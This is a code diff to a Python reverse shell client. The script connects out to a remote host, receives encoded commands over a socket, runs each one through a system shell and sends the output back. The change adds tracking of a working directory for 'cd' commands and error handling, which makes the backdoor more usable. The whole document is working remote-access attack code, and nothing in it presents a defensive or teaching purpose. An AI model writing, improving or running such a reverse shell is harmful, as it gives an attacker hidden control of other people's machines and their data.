@@ -28,18 +28,36 @@ def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((RHOST,RPORT))
     # Receiving commands from the remote system
+    currentDirectory="./"
     while True:
         data1=s.recv(4096)
         print("Received command is:",data1)
         data=de(data1)
+        test=data.decode()
+        if test[:2]=='cd':
+            try:
+                currentDirectory+=test.split()[1]+"/"
+                print('The current directory is:',currentDirectory)
+                mess='Changed Directory~'
+                mess=en(mess)
+                s.send(mess)
+            except:
+                mess=en('Error...~')
+                s.send(mess)
         # Executing the output using the subprocess lib
-        comm=subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        res1,res2=comm.communicate()
-        res=res1.decode()+'~'+res2.decode()
-        # Sending the encoded data over the sockets
-        res=en(res)
-        s.send(res)
-        # s.close()
+        else:
+            print("Current directory is:",currentDirectory)
+            try:
+                comm=subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=currentDirectory)
+                res1,res2=comm.communicate()
+                res=res1.decode()+'~'+res2.decode()
+                # Sending the encoded data over the sockets
+                res=en(res)
+                s.send(res)
+            except:
+                res=en("Error...")
+                s.send(res)
+            # s.close()
 
 if __name__ == '__main__':
     main()
